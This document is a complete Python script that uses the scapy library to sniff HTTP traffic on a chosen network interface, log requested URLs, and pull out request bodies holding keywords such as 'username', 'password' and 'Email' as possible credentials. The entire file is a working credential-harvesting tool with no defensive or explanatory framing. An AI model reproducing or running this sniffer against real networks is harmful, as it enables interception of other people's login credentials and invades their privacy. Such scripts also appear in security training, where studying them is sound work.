#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

import optparse
parser=optparse.OptionParser()
parser.add_option("-i", "--iface", dest="interface", help="put interface to sniff packets from it")
(options,arguments)=parser.parse_args()
iface=options.interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "user", "login", "password", "pass", "Uname","Email","E-mail","e-mail","Password"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
   if packet.haslayer(http.HTTPRequest):
       url=get_url(packet)
       print("[+] HTTP Request>>"+url)

       login_info = get_login_info(packet)
       if login_info:
           print("\n\n[+]Possible username/password>>" + login_info + "\n\n")
sniff(iface)
